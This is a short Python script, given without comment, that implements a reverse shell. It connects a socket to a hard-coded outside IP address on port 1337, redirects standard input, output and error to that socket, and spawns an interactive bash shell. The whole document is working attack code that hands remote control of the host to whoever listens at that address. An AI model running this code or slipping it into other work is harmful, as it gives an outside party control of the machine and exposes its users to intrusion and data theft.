import os
import pty
import socket

s=socket.socket()
s.connect(("95.164.90.43",1337))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
pty.spawn("/bin/bash")
